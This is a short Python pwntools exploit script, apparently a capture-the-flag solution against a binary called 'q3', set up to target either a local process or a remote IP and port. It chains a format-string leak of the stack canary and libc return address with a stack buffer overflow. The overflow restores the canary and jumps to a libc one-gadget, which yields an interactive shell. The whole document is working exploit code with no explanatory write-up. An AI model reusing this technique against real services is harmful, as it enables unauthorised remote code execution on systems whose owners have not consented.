from pwn import *

if __debug__:
	r = process("./q3")
	main_ret_offset = 0x21b97
	oneshot_offset = 0x4f2c5
else:
	r = remote("68.183.158.95", 8991)
	main_ret_offset = 0x20830
	oneshot_offset = 0x45216

payload = "%11$lx:%13$lx"
r.sendline(payload)

r.readline()	#hello

canary, main_ret_addr = r.readline().strip().split(":")
canary = int(canary, 16)
main_ret_addr = int(main_ret_addr, 16)
libc_base = main_ret_addr - main_ret_offset

print "canary", hex(canary)
print "libc_base", hex(libc_base)

oneshot_addr = libc_base + oneshot_offset

payload = "A" * (0x20 - 8)
payload += p64(canary)
payload += "B" * 8			#rbp
payload += p64(oneshot_addr)

r.sendline(payload)

r.interactive()
